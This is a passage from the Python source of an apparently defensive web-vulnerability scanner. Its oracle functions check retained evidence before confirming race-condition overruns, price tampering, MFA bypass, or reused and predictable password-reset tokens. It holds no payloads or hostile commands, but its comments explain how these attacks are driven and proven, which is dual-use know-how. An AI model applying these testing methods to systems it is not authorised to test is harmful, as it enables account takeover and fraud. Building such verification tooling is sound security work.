    # decisive; a NON-fire is ``conclusive`` ONLY for a channel-confirmed CLEAN (a properly-locked
    # resource with successes<=max_allowed, or a validating flow whose danger predicate is false). A
    # missing owner attestation / missing semantic predicate / malformed record is a LEAD/INCONCLUSIVE
    # (conclusive=False) — never a CLEAN: absence of a positive channel is not proof the surface is safe.
    return OracleSignal(kind=OracleKind.ACHIEVED_STATE, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed=observed)


# ---------------------------------------------------------------------------
# 4a-ter. MFA BYPASS (Wave-4.5, gated-workflow, opt-in) — CWE-287 / CWE-308, its OWN OracleKind.MFA_BYPASS.
# ---------------------------------------------------------------------------
#
# WHAT THIS PROVES AND WHY IT IS SOUND. A "second-factor bypass" is an ACHIEVED-STATE claim: a session that
# completed ONLY factor-1 (username+password / a magic link / an SSO first hop) nevertheless reaches a resource
# the app is supposed to release ONLY after factor-2. Wave-3 proved (six rounds) that an achieved
# authenticated/accepted state CANNOT be proven from response CONTENT — a marker/substance/shape heuristic is
# defeated by a benign app whose response merely VARIES by credential presence, AND, worse here, by the KILLER
# FALSE POSITIVE of an INTENTIONALLY factor-1 page: a page the operator deliberately serves to a
# password-only session (a public dashboard, a "verify your device" landing page) is byte-for-byte
# indistinguishable, from the outside, from a page that leaked past MFA. No automatic content check can tell a
# deliberate factor-1 surface from a bypassed one.
#
# THE HONEST RESOLUTION — TWO INDEPENDENT LOCKS, BOTH REQUIRED (exactly the Wave-3.4 forgery-acceptance shape).
#   LOCK 1 — a FAIL-CLOSED OPERATOR ATTESTATION (the un-auto-verifiable part). The operator must ATTEST three
#            things, re-asserted from the retained record at EVERY (re-)verification so a tampered/absent
#            certificate refuses to mint offline:
#              (a) ``mfa_enrolled_account``        — the account under test genuinely has factor-2 ENROLLED;
#              (b) ``factor1_only_presented``      — VIGIL's session completed ONLY factor-1 (no OTP/WebAuthn/
#                                                    push was supplied) — so a fire is a BYPASS, not a login;
#              (c) ``post_mfa_resource_certified`` — the read resource/datum is genuinely gated BEHIND factor-2
#                                                    (NOT an intentionally factor-1 page) — the lock that closes
#                                                    the killer FP.
#            WITHOUT all three (strict ``is True``) the oracle emits NO fire for ANY input — benign or not — and
#            the class is a rigorous LEAD. This is the one property no byte check can decide (is this page
#            supposed to require MFA?), so it moves to an explicit operator attestation, not a defeatable guard.
#   LOCK 2 — the PRIVATE-READ REDUCTION (the auto-verifiable part; reuses SESSION_FIXATION / Wave-3.1's
#            ``_sfx_private_read_achieved`` that PASSED adversarial review). WITH the attestation, the achieved
#            bypass is proven ONLY when a genuine operator-supplied victim-PRIVATE datum D satisfies ALL of:
#              (a) D PRESENT in the factor-1-only session's SUBSTANTIVE read of the post-MFA resource;
#              (b) D PRESENT in a fully-authenticated (post-MFA) OWNER's authoritative read (the POSITIVE
#                  reference — D is REAL private content, not chrome shown for any credential);
#              (c) D ABSENT from a SUBSTANTIVE SAME-SHAPE 2xx read by an OTHER not-post-MFA identity (the
#                  DECISIVE clause — cosmetic chrome shown for any credential appears there too) AND ABSENT from
#                  a valid no-session gating baseline;
#              (d) D a valid, non-reflected discriminator.
#            A denial / empty / error / different-shape negative reference is REFUSED (its absent D is vacuous)
#            ⇒ fail closed to a LEAD. The differential is re-derived from the RETAINED RAW bytes (never a bool).
#
# SOUNDNESS. LOCK 1 answers "is this resource supposed to require MFA, and did VIGIL really present only
# factor-1?"; LOCK 2 answers "did the factor-1-only session ACTUALLY read the victim's private, access-gated
# datum?". Together they mint a GATED-WORKFLOW FACT; the residual is operator MISCERTIFICATION (attesting a
# factor-1 page as post-MFA-gated), the identical bound Wave-3.1 / Wave-3.4 were accepted with. The BENIGN TWIN
# — an app that correctly enforces factor-2 — never fires even WITH the attestation: the factor-1-only read does
# not carry D (D present only for the post-MFA owner), so the differential is ``False`` ⇒ a channel-confirmed
# CLEAN, never a FACT. Nothing in the default scan/engage roster supplies the attestation or the private D +
# references, so the class MINTS NOTHING at runtime (an honest LEAD) and `make gate` stays byte-identical.


# The three attestation fields the operator must set (strict ``is True``). Any missing/false/non-bool ⇒ the
# oracle refuses to mint — the killer FP (an intentionally factor-1 page) can never round to a FACT without (c).
_MFA_ATTESTATION_FIELDS: tuple[str, ...] = (
    "mfa_enrolled_account",         # the account under test genuinely has a second factor ENROLLED
    "factor1_only_presented",       # VIGIL's session completed ONLY factor-1 (no OTP/WebAuthn/push supplied)
    "post_mfa_resource_certified",  # the read resource/datum is genuinely gated BEHIND factor-2 (closes the FP)
)


def _mfa_attested(attestation: Any) -> bool:
    """The FAIL-CLOSED operator attestation — a HARD precondition, re-derived from the retained record at every
    verification. True ONLY when the record carries all three attestation fields set with strict ``is True`` (a
    truthy non-bool does NOT pass). Absent / partial / false ⇒ the oracle refuses to mint (an honest LEAD): an
    intentionally factor-1 page is otherwise indistinguishable from a bypass."""
    if not isinstance(attestation, Mapping):
        return False
    return all(attestation.get(f) is True for f in _MFA_ATTESTATION_FIELDS)


def _mfa_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.92,
                conclusive: bool = False) -> OracleSignal:
    # kind is the DEDICATED OracleKind.MFA_BYPASS (held OUT of the frozen _ALL_ORACLES, so
    # oracle_version(ACHIEVED_STATE) is untouched and the unknown-class fallback stays EXACTLY 15). A fire is
    # always decisive; a NON-fire is ``conclusive`` ONLY for a channel-confirmed clean (attested AND the
    # factor-1-only session provably did NOT reach the victim's post-MFA private view — the app enforces
    # factor-2). An un-attested / undecidable-differential non-fire is a LEAD (conclusive=False), never a CLEAN.
    return OracleSignal(kind=OracleKind.MFA_BYPASS, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed=observed)


def _workflow_resp_pair(resp: Any) -> dict[str, Any]:
    """Normalise one retained burst response into the ``{status, body}`` the operator's semantic
    success predicate reads. Pure — never fetches anything."""
    if isinstance(resp, Mapping):
        return {"status": resp.get("status"), "body": _coerce_text(resp.get("body"))}
    return {"status": None, "body": _coerce_text(resp)}


def _workflow_race(obs: Mapping[str, Any], base: dict) -> OracleSignal:
    try:
        max_allowed = int(obs.get("max_allowed"))
    except (TypeError, ValueError):
        return _workflow_signal(
            False, observed=base,
            evidence="race: max_allowed is missing or not an integer — cannot adjudicate (inconclusive)")
    if max_allowed < 0:
        return _workflow_signal(
            False, observed=base,
            evidence="race: max_allowed is negative — malformed spec (inconclusive)")

    responses = obs.get("responses")
    if not isinstance(responses, (list, tuple)) or not responses:
        return _workflow_signal(
            False, observed=base,
            evidence="race: no retained burst responses to re-derive the success count over (inconclusive)")

    predicate = obs.get("success_predicate")
    if not isinstance(predicate, Mapping) or not predicate:
        # A12: a bare any-2xx count does not prove a should-be-atomic resource was over-CONSUMED — a
        # benignly-idempotent endpoint returns 2xx to every concurrent request. Without an operator-
        # declared SEMANTIC success predicate proving each COMMIT, the over-count is a LEAD, not a FACT.
        return _workflow_signal(
            False, observed={**base, "n_responses": len(responses), "semantic_predicate": False},
            evidence=("race: no SEMANTIC success predicate supplied — an any-2xx concurrent-success count "
                      "does not prove over-consumption (a benignly-idempotent endpoint returns 2xx to every "
                      "request); this is a LEAD, not a FACT"))

    # RE-DERIVE the success count from the RAW retained responses by re-evaluating the operator's
    # semantic predicate over EACH one (never a trusted pre-computed integer). A malformed predicate over
    # any response ⇒ inconclusive (fail closed, never fabricate a count).
    successes = 0
    try:
        for resp in responses:
            hit, _ = _eval_predicate(predicate, _workflow_resp_pair(resp))
            if hit:
                successes += 1
    except (ValueError, TypeError) as e:
        return _workflow_signal(
            False, observed={**base, "n_responses": len(responses)},
            evidence=f"race: malformed success predicate ({e}) — cannot re-derive the count (inconclusive)")

    detail = {**base, "n_responses": len(responses), "successes": successes,
              "max_allowed": max_allowed, "semantic_predicate": True}
    if successes > max_allowed:
        return _workflow_signal(
            True, conf=0.9, observed=detail,
            evidence=(f"limit-overrun race: a should-be-atomic action committed {successes} time(s) in a "
                      f"single-packet burst — re-derived from the raw responses by the operator's SEMANTIC "
                      f"success predicate — exceeding its permitted maximum of {max_allowed}. The check-then-"
                      f"act window is unguarded (a TOCTOU double-spend / one-time-token reuse race)."))
    return _workflow_signal(
        False, conclusive=True, observed=detail,
        evidence=(f"race: the action committed {successes} time(s) under the burst — within its permitted "
                  f"maximum of {max_allowed} (re-derived by the semantic success predicate) — the resource "
                  f"is properly locked; did not fire"))


def _workflow_tamper(obs: Mapping[str, Any], base: dict) -> OracleSignal:
    danger = obs.get("danger")
    if not isinstance(danger, Mapping) or not danger:
        return _workflow_signal(
            False, observed=base,
            evidence="tamper: no danger predicate supplied — cannot adjudicate the post-state (inconclusive)")
    observed_state = obs.get("observed_state")
    if not isinstance(observed_state, Mapping):
        return _workflow_signal(
            False, observed=base,
            evidence="tamper: no observed post-state supplied — cannot adjudicate (inconclusive)")
    try:
        fired, evidence = _eval_predicate(danger, dict(observed_state))
    except (ValueError, TypeError) as e:
        return _workflow_signal(
            False, observed=base,
            evidence=f"tamper: malformed danger predicate ({e}) — cannot adjudicate (inconclusive)")
    detail = {**base, "danger_eval": evidence, "observed_state": dict(observed_state)}
    if fired:
        return _workflow_signal(
            True, conf=0.9, observed=detail,
            evidence=(f"price/parameter tampering accepted into a dangerous persisted state: the operator's "
                      f"danger predicate holds over the observed post-state ({evidence}). Server-side "
                      f"validation of the price/quantity is missing, so a negative/overflow/tampered value "
                      f"was driven straight into the persisted order/balance."))
    return _workflow_signal(
        False, conclusive=True, observed=detail,
        evidence=(f"tamper: the danger predicate does NOT hold over the observed post-state ({evidence}) — "
                  f"the flow validated/clamped the tampered value; did not fire"))


def workflow_abuse_oracle(observed: Any) -> OracleSignal:
    """Fire on a race limit-overrun (COUNT-based) or an accepted price/parameter tampering — BOTH
    gated behind the OWNER-SIGNED WorkflowSpec attestation (Wave-4.4). ``observed`` is the retained
    record ``scanner.race`` / ``scanner.bizlogic`` (or ``live.race_bizlogic_redrive``) captured:

      * ``mode`` — ``"race"`` or ``"tamper"``;
      * ``owner_signed_spec`` — the runner-attested fact that it cryptographically verified the owner's
        Ed25519 signature over the canonical WorkflowSpec AST BEFORE running any state-changing step
        (the FATAL-2-safe gated-workflow attestation; the certificate binds it);
      * RACE: ``max_allowed`` (int), ``responses`` (the raw ``{status, body}`` burst outcomes), and
        ``success_predicate`` (the operator's SEMANTIC per-response commit predicate — a pure JSON AST);
      * TAMPER: ``observed_state`` (the retained post-state) and ``danger`` (the operator's danger
        predicate — a pure JSON AST).

    Adjudication: an unknown mode, a missing owner attestation, or a malformed record ⇒ INCONCLUSIVE;
    a race with no semantic success predicate ⇒ LEAD (an any-2xx count is not proof of over-consumption);
    a race whose semantic-predicate-re-derived successes exceed max_allowed ⇒ FIRE, else channel-
    confirmed CLEAN (properly locked); a tamper whose danger predicate holds over the post-state ⇒ FIRE,
    else channel-confirmed CLEAN (the flow validated the value). Pure + deterministic; never raises."""
    obs = observed if isinstance(observed, Mapping) else {}
    mode = _coerce_text(obs.get("mode")).strip().lower()
    owner_signed = obs.get("owner_signed_spec") is True
    base = {"mode": mode, "owner_signed_spec": owner_signed}

    if mode not in _WORKFLOW_MODES:
        return _workflow_signal(
            False, observed=base,
            evidence=(f"unknown workflow-abuse mode {mode!r} (expected one of {_WORKFLOW_MODES}) — "
                      f"cannot adjudicate (inconclusive)"))

    # FAIL CLOSED behind the owner-signed WorkflowSpec attestation. Without it the WorkflowSpec is not
    # proven operator intent and the state-changing steps were not owner-approved ⇒ INCONCLUSIVE.
    if not owner_signed:
        return _workflow_signal(
            False, observed=base,
            evidence=("no OWNER-SIGNED WorkflowSpec attestation (owner_signed_spec != true) — the spec is "
                      "not proven operator intent and the state-changing steps were not owner-approved; "
                      "cannot mint (inconclusive, never a FACT)"))

    if mode == "race":
        return _workflow_race(obs, base)
    return _workflow_tamper(obs, base)


def mfa_bypass_oracle(observed: Any) -> OracleSignal:
    """Fire when a session that completed ONLY factor-1 achieves a read of a victim-PRIVATE datum the app gates
    BEHIND factor-2 — the ACHIEVED-STATE proof of an MFA bypass (CWE-287 improper authentication / CWE-308
    single-factor-only), under a FAIL-CLOSED operator attestation. An achieved post-MFA state CANNOT be proven
    from response content, and an intentionally factor-1 page is indistinguishable from a bypass without operator
    intent, so this oracle requires BOTH the three-part attestation (LOCK 1) AND the PRIVATE-READ REDUCTION
    (LOCK 2, reusing :func:`_sfx_private_read_achieved`) — re-derived from RAW retained bytes, never a bool.

    ``observed`` is the retained record ``scanner.mfa.MfaBypassCheck`` captured through the gated ``send``:

      * ``operator_attestation`` — ``{mfa_enrolled_account, factor1_only_presented, post_mfa_resource_certified}``
        (each strict ``is True``): the HARD certification gate;
      * ``private_discriminator`` (D) — the operator's genuine victim-PRIVATE post-MFA-gated datum;
      * ``factor1_view``  — ``{status, body}`` of the post-MFA resource read carrying ONLY the factor-1 session;
      * ``owner_view``    — ``{status, body}`` of the SAME resource read by the fully post-MFA-authenticated
        owner (the POSITIVE reference: D must be PRESENT);
      * ``pre_mfa_ref``   — ``{status, body}`` of the SAME resource read by an OTHER not-post-MFA identity (the
        DECISIVE SAME-SHAPE negative reference: a substantive 2xx from which D must be ABSENT);
      * ``logged_out_ref``— ``{status, body}`` of the SAME resource with NO session (the no-session baseline);
      * ``logged_out_markers`` / ``logged_out_statuses`` — the operator's decisive not-authenticated signals.

    Adjudication:

      * attestation NOT fully present (LOCK 1 open) ⇒ NO fire for ANY input — refuse to mint (LEAD); the killer
        FP of an intentionally factor-1 page can never round to a FACT;
      * attested, but :func:`_sfx_private_read_achieved` is ``None`` (no / invalid / reflected D; a
        non-substantive factor-1 read; no substantive owner positive reference or D absent from it; no
        substantive SAME-SHAPE other-identity reference; no valid no-session baseline; or D present in a negative
        reference) ⇒ LEAD (never a FACT, never a false CLEAN);
      * attested, and the factor-1-only session did NOT reach the victim's post-MFA private view (D absent from
        its otherwise-substantive read, present for the owner) ⇒ the app enforces factor-2 — channel-confirmed
        CLEAN (the benign twin);
      * attested, and the factor-1-only session reached the victim's post-MFA private view ⇒ FIRE.

    Pure + deterministic; never raises."""
    obs = observed if isinstance(observed, Mapping) else {}
    attested = _mfa_attested(obs.get("operator_attestation"))
    discriminator = _coerce_text(obs.get("private_discriminator")).strip()
    base = {"operator_attested": attested}

    # LOCK 1 — the FAIL-CLOSED operator attestation (Wave-3.4 certification-gate shape), re-derived from the
    # retained record at EVERY verification so a tampered / absent attestation refuses to mint offline. This is
    # the HARD precondition and it is checked FIRST, so NO input — benign or a bypass — mints without it, and an
    # intentionally factor-1 page (the killer FP) can never round to a FACT.
    if not attested:
        return _mfa_signal(
            False, observed=base,
            evidence=("no complete operator MFA attestation (mfa_enrolled_account + factor1_only_presented + "
                      "post_mfa_resource_certified, each strict True) — refuse to mint (LEAD). An intentionally "
                      "factor-1 page is indistinguishable from a bypass without the operator certifying the "
                      "resource is genuinely post-MFA-gated; absent the attestation this class is a rigorous LEAD"))

    # LOCK 2 — RE-DERIVE the achieved post-MFA read from RAW retained bytes via the PRIVATE-READ REDUCTION (the
    # SAME machinery SESSION_FIXATION / Wave-3.1 IDOR use). No VIGIL cookie sentinel here (a real factor-1
    # login), so no per-probe sentinel is passed; the (a)-(c) private-read differential is the load-bearing
    # proof. None ⇒ undecidable (no/invalid/reflected D, non-substantive factor-1 read, missing/failing owner
    # positive reference, missing/non-substantive-same-shape other-identity reference, missing/invalid
    # no-session baseline, or D present in a negative reference) ⇒ LEAD.
    reached = _sfx_private_read_achieved(discriminator, obs.get("factor1_view"), obs.get("owner_view"),
                                         obs.get("pre_mfa_ref"), obs.get("logged_out_ref"),
                                         obs.get("logged_out_markers"), obs.get("logged_out_statuses"),
                                         sentinel_id="")
    if reached is None:
        return _mfa_signal(
            False, observed={**base, "discriminator_len": len(discriminator)},
            evidence=("attested, but the achieved post-MFA state could not be proven by the PRIVATE-READ "
                      "differential (no valid victim-private discriminator D; a non-substantive factor-1 read; no "
                      "substantive post-MFA owner positive reference or D absent from it; no substantive "
                      "SAME-SHAPE other-identity reference — a denial/empty/error/different-shape is refused; no "
                      "valid no-session baseline; or D present in a negative reference — chrome/shared/public) — "
                      "cannot mint (LEAD)"))

    # attested AND the factor-1-only session did NOT reach the victim's post-MFA private view ⇒ the app enforces
    # factor-2 (the benign twin). D absent from the factor-1-only read yet present for the owner — a
    # channel-confirmed CLEAN, never a FACT.
    if reached is not True:
        return _mfa_signal(
            False, conclusive=True, observed={**base, "factor1_reached_private": False},
            evidence=("the factor-1-only session did not reach the victim's post-MFA private view (the private "
                      "datum D is absent from its read, present for the post-MFA owner) — the app enforces the "
                      "second factor; did not fire"))

    return _mfa_signal(
        True, conf=0.92,
        evidence=("MFA bypass: a session that completed ONLY factor-1 achieved a read of a victim-PRIVATE datum "
                  "the app gates behind factor-2 — the private discriminator D is PRESENT in the factor-1-only "
                  "read AND in the fully post-MFA-authenticated owner's read yet PROVABLY ABSENT from a "
                  "SUBSTANTIVE SAME-SHAPE read by an OTHER not-post-MFA identity and from a no-session baseline "
                  "(the private-read differential proves the factor-1-only session reached the victim's "
                  "post-MFA-gated content), under the operator's attestation that the account is MFA-enrolled, "
                  "only factor-1 was presented, and the resource is genuinely post-MFA-gated"),
        observed={"operator_attested": True, "factor1_reached_private": True,
                  "differential": "private_datum_present_in_factor1_only_and_owner_reads_absent_in_same_shape_"
                  "other_identity_and_no_session_references"})


# ---------------------------------------------------------------------------
# 4a-bis. Password-reset / account-recovery token invariant (Wave 4.3)
#   CWE-640 (weak recovery) / CWE-613 (insufficient session expiration) / CWE-330 (insufficiently-random).
#   FACTs ONLY the invariant-FREE sub-properties (no operator intent needed to know they are wrong):
#     * token REUSE / NON-EXPIRY — a consumed reset token is REPLAYED and the second submit GENUINELY
#       succeeds, proven by the PRIVATE-READ REDUCTION (reusing :func:`_sfx_private_read_achieved`, the same
#       same-shape differential Wave-3.1 IDOR/BOLA and Wave-3.2 session fixation use), never a bare 200. The
#       achieved read is BOUND to the REPLAY-set secret P2 (a fresh VIGIL secret DISTINCT from the consumed P1,
#       and the read explicitly reached WITH P2) — mirroring session fixation's sentinel-binding, so a fire
#       proves the REPLAY re-changed the credential, never a leftover consume-session or the consumed P1;
#     * deterministic COLLISION — a genuinely-EXPLOITABLE predicate only: a PREDICTABLE counter (>=3 tokens
#       forming an EXACT arithmetic progression, reproduced from the observed sequence — observe one token,
#       predict the next; exploitable regardless of identity). A BYTE-IDENTICAL token — whether it repeats for
#       the SAME account LABEL or across DIFFERENT account LABELS — is DELIBERATELY NOT a FACT: account labels
#       are opaque strings never proven to be distinct PRINCIPALS (a benign identifier-NORMALIZING generator
#       returns byte-identical tokens for 'alice'/'Alice' = ONE principal; a cryptographically-secure
#       DETERMINISTIC generator returns byte-identical tokens for one user within a timestamp bucket), so it
#       FAILS CLOSED to a LEAD. Predictable-by-ENTROPY is likewise NOT a FACT (a probabilistic LEAD elsewhere).
#   GENUINE CROSS-PRINCIPAL exploitation of a colliding / reused recovery token (an achieved cross-account READ)
#   is proven ONLY by the EXISTING ACHIEVED_STATE IdorCheck same-shape private-read differential (bug_class
#   `password_reset_cross_user` — a token issued to principal A actually READS principal B's PRIVATE datum),
#   NEVER by account-label identity here; reset-link HOST-POISONING routes to the EXISTING host_header_injection
#   FACT.
# ---------------------------------------------------------------------------

_PRT_MIN_TOKEN = 8                  # a reset token below this is too short to reason about a collision soundly
_PRT_MIN_SECRET = 8                 # a VIGIL replay/consume secret below this is too short to bind an achieved read
_PRT_MIN_COLLISION_SAMPLES = 2      # a collision adjudication needs >=2 independent captures
_PRT_MIN_ADJACENCY_SAMPLES = 3      # a deterministic arithmetic progression needs >=3 to exclude coincidence
_PRT_HEX_RE = re.compile(r"^[0-9a-fA-F]+$")
_PRT_DEC_RE = re.compile(r"^[0-9]+$")


def _prt_signal(fired: bool, *, mode: str, evidence: str, observed: dict, conf: float = 0.92,
                conclusive: bool = False) -> OracleSignal:
    # kind is the DEDICATED OracleKind.PASSWORD_RESET_INVARIANT (held OUT of the frozen _ALL_ORACLES, so the
    # unknown-class fallback stays EXACTLY 15 and oracle_version(ACHIEVED_STATE) is untouched). A fire is always
    # decisive; a NON-fire is ``conclusive`` ONLY for a channel-confirmed clean (a single-use token that
    # correctly expired; a set of distinct high-entropy tokens) — an undecidable/insufficient-sample non-fire is
    # a LEAD (conclusive=False), never a false CLEAN.
    return OracleSignal(kind=OracleKind.PASSWORD_RESET_INVARIANT, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed={**observed, "mode": mode})


def _prt_parse_counter(tok: str) -> "int | None":
    """A reset token's numeric value if it is a PURE decimal or PURE hex integer, else ``None``. Deterministic;
    used ONLY to test an EXACT arithmetic progression (the deterministic 'adjacent' collision), never entropy."""
    t = _coerce_text(tok).strip()
    if not t:
        return None
    if _PRT_DEC_RE.match(t):
        try:
            return int(t, 10)
        except ValueError:
            return None
    if _PRT_HEX_RE.match(t):
        try:
            return int(t, 16)
        except ValueError:
            return None
    return None


def _prt_normalize_samples(raw: Any) -> "list[tuple[str, str]]":
    """Coerce the retained collision captures into ``(token, account)`` pairs, in request order. Accepts the
    canonical richer form (a list of ``{"token","account"}`` mappings the scanner now records so a CROSS-USER
    identical token can be proven) OR a flat list of token strings (accounts UNKNOWN — a cross-user identity
    cannot be established, so a byte-identical pair fails closed to a LEAD, never a FACT)."""
    out: list[tuple[str, str]] = []
    for item in (raw or []):
        if isinstance(item, Mapping):
            tok = _coerce_text(item.get("token")).strip()
            acct = _coerce_text(item.get("account")).strip()
        else:
            tok, acct = _coerce_text(item).strip(), ""
        if tok:
            out.append((tok, acct))
    return out


def _prt_collision(samples: Any) -> "tuple[bool | None, dict]":
    """Deterministic collision adjudication over reset tokens captured from INDEPENDENT requests (in request
    order), each carrying the account LABEL it was issued for. The ONLY genuinely-EXPLOITABLE predicate provable
    from the token bytes ALONE is a PREDICTABLE COUNTER (an exact arithmetic progression). A BYTE-IDENTICAL token
    — whether it repeats for the SAME account LABEL or across DIFFERENT account LABELS — is DELIBERATELY NOT a
    FACT here: account labels are opaque strings NEVER proven to be distinct PRINCIPALS. A benign per-user-
    DETERMINISTIC, identifier-NORMALIZING generator (case-insensitive email/username) returns byte-identical
    tokens for 'alice' and 'Alice' — ONE principal, not two — so a byte-identical token across labels would mint
    a FALSE cross-user FACT; and a cryptographically-secure DETERMINISTIC generator (stock Django
    default_token_generator within a timestamp bucket, a cache-one-token-per-account app) returns byte-identical
    tokens for one user. Genuine CROSS-PRINCIPAL exploitation is proven ONLY by the EXISTING
    ``password_reset_cross_user`` private-read differential (a token issued to principal A actually authorizes a
    read of principal B's PRIVATE datum), never by label identity here. TRI-STATE:

      * ``True``  — a PREDICTABLE counter: >=3 tokens forming an EXACT arithmetic progression (every token parses
        as a fixed-width integer counter and the step between consecutive values is a single constant nonzero
        delta, reproduced from the observed sequence). Genuinely exploitable regardless of identity: observe one
        token, predict the next. This is the ONLY token-shape provable as a FACT from the captures alone;
      * ``False`` — all tokens DISTINCT with no exact progression ⇒ proper generation ⇒ channel-confirmed clean;
      * ``None``  — fewer than 2 samples, any sample below the minimum length, OR ANY byte-identical repeat (same
        OR cross label) with no exact progression ⇒ undecidable ⇒ LEAD, never a FACT, never a CLEAN. A
        byte-identical repeat across DIFFERENT labels is a LEAD to escalate via the cross-user private-read
        differential — it is NOT proof of a weak generator on its own.

    ENTROPY is never scored here: a set of distinct tokens is CLEAN regardless of apparent randomness — a
    low-entropy-but-distinct token stays a probabilistic LEAD in the scanner, never a FACT."""
    pairs = _prt_normalize_samples(samples)
    toks = [t for t, _ in pairs]
    if len(pairs) < _PRT_MIN_COLLISION_SAMPLES or any(len(t) < _PRT_MIN_TOKEN for t in toks):
        return None, {"n": len(pairs)}
    # (1) EXACT deterministic arithmetic progression (>=3 fixed-width integer counters, constant nonzero step) —
    # a PREDICTABLE counter reproduced from the observed sequence. Sound regardless of account label: a
    # predictable counter is exploitable across principals (observe one token, predict the next). This is the
    # ONLY token-shape a FACT can rest on from the captures alone.
    if len(toks) >= _PRT_MIN_ADJACENCY_SAMPLES and len({len(t) for t in toks}) == 1:
        vals = [_prt_parse_counter(t) for t in toks]
        if all(v is not None for v in vals):
            steps = [vals[i + 1] - vals[i] for i in range(len(vals) - 1)]  # type: ignore[operator]
            if steps and steps[0] != 0 and all(s == steps[0] for s in steps):
                return True, {"identical": False, "arithmetic": True, "samples": len(toks), "step": steps[0]}
    # (2) ANY byte-identical repeat — SAME account label OR across DIFFERENT account LABELS — with no exact
    # progression ⇒ UNDECIDABLE ⇒ LEAD, never a FACT: account labels are never proven to be distinct PRINCIPALS
    # (a benign identifier-NORMALIZING generator returns byte-identical tokens for 'alice'/'Alice' = ONE
    # principal), and a deterministic-but-secure generator returns byte-identical tokens for one user. Surface
    # whether the repeat SPANNED distinct labels (a stronger LEAD to escalate via the cross-user private-read
    # differential), but NEVER mint here — genuine cross-principal exploitation is proven only by
    # ``password_reset_cross_user`` (the private-read reduction), never by token identity.
    if len(set(toks)) < len(toks):
        by_token: dict[str, set[str]] = {}
        for tok, acct in pairs:
            by_token.setdefault(tok, set()).add(acct)
        cross_label = any(len({a for a in accts if a}) >= 2 for accts in by_token.values())
        return None, {"identical_lead": True, "cross_label": cross_label, "samples": len(pairs)}
    # (3) all tokens DISTINCT, no exact progression ⇒ proper generation ⇒ clean.
    return False, {"distinct": len(set(toks)), "samples": len(pairs)}


def _prt_reuse_p2_binding(replay_secret: str, consumed_secret: str, authorized_secret: str,
                          discriminator: str, authorized_view: Any) -> "str | None":
    """Bind the achieved token-reuse read to the REPLAY-set secret P2 — mirroring session fixation's
    sentinel-binding discipline. Returns a LEAD reason string if the binding fails (⇒ the oracle degrades to a
    LEAD, never a FACT), or ``None`` when the binding holds. The binding is what makes a reuse FACT sound: a
    single-use / expiring token whose replay set NOTHING could still read the private datum via a leftover
    session established by the FIRST consume; without this binding that would mint a FALSE reuse FACT. So a fire
    requires the achieved read to be provably attributable to the REPLAY (P2), not the consume (P1):

      * ``replay_secret`` (P2) present and non-trivial (a fresh VIGIL secret the replay set);
      * ``consumed_secret`` (P1) present and non-trivial AND DISTINCT from P2 — so a successful authenticated
        read cannot be attributed to the FIRST consume;
      * ``authorized_secret`` == ``replay_secret`` — the authenticated read was EXPLICITLY reached WITH P2 (not
        P1, not a leftover consume-session);
      * D is not an echo of P2 (a substring of, or present only as part of, the reflected secret) — the
        reflected-value / straddle guard, mirroring the sentinel echo guard in ``_sfx_private_read_achieved``."""
    if len(replay_secret) < _PRT_MIN_SECRET:
        return ("the replay-set secret P2 is absent or too short to bind the achieved read to the replayed "
                "token — cannot mint (LEAD)")
    if len(consumed_secret) < _PRT_MIN_SECRET or replay_secret == consumed_secret:
        return ("the replay-set secret P2 is not a distinct, non-trivial secret from the consumed secret P1 — a "
                "successful read cannot be attributed to the REPLAY rather than the first consume (LEAD)")
    if authorized_secret != replay_secret:
        return ("the authenticated read was NOT reached with the replay-set secret P2 (authorized_secret != "
                "replay_secret) — the achieved state is not bound to the replayed token (e.g. a leftover "
                "consume-session or the consumed P1) — cannot mint (LEAD)")
    if discriminator and discriminator in replay_secret:
        return ("the private datum D is a substring of the replay-set secret P2 (a credential echo, not "
                "access-gated content) — cannot mint (LEAD)")
    a_body = _coerce_text(authorized_view.get("body")) if isinstance(authorized_view, Mapping) else ""
    if replay_secret and replay_secret in a_body and discriminator and discriminator in a_body \
            and discriminator not in a_body.replace(replay_secret, "\x00"):
        return ("the private datum D appears in the replay-authenticated read ONLY as part of the echoed secret "
                "P2 — a credential echo, not access-gated content — cannot mint (LEAD)")
    return None


def password_reset_invariant_oracle(observed: Any) -> OracleSignal:
    """Fire on an invariant-FREE password-reset / account-recovery sub-property, proven WITHOUT operator intent
    over VIGIL's OWN retained raw bytes (never a bool, never a bare marker/entropy heuristic). ``observed`` is
    the record ``scanner.reset`` captured through the gated send; ``mode`` selects the sub-property:

      * ``token_reuse`` — a reset token that was CONSUMED (set the account password to a first VIGIL secret P1)
        is REPLAYED to set a SECOND, unique VIGIL secret P2; the runner then AUTHENTICATES with P2 and reads the
        account. The achieved read is first BOUND to P2 (:func:`_prt_reuse_p2_binding` — P2 present + non-trivial
        + DISTINCT from P1, the read explicitly reached WITH P2, D not an echo of P2), mirroring session
        fixation's sentinel-binding so a fire proves the REPLAY re-changed the credential, never a leftover
        consume-session or the consumed P1. It then fires ONLY when the PRIVATE-READ REDUCTION
        (:func:`_sfx_private_read_achieved`) proves that read reached a victim-PRIVATE datum D — D PRESENT in the
        replay-authenticated read AND in the owner's authoritative read yet PROVABLY ABSENT from a SUBSTANTIVE
        SAME-SHAPE unauthorized read and a no-session baseline (so the second submit GENUINELY changed the
        credential, not merely returned 200). A single-use token that correctly expires (the benign twin) leaves
        P2 unset — the replay-authenticated read never reaches D ⇒ channel-confirmed CLEAN. A failed P2-binding
        (P2 absent/short/equal-to-P1, or the read reached with the WRONG secret), no/invalid/reflected D, a
        missing positive or same-shape negative reference, D present in a negative reference, or a non-substantive
        read ⇒ LEAD (never a FACT, never a false CLEAN).
      * ``token_collision`` — ``samples`` are ``{token, account}`` captures from INDEPENDENT reset requests (in
        order); a flat ``tokens`` list is accepted with account labels UNKNOWN. Fires ONLY on a genuinely-
        EXPLOITABLE PREDICTABLE COUNTER (:func:`_prt_collision`): >=3 tokens forming an EXACT arithmetic
        progression (observe one token, predict the next — exploitable regardless of identity). A BYTE-IDENTICAL
        token — same account LABEL or across DIFFERENT account LABELS — is DELIBERATELY NOT a FACT: account labels
        are never proven to be distinct PRINCIPALS (a benign identifier-NORMALIZING generator maps 'alice'/'Alice'
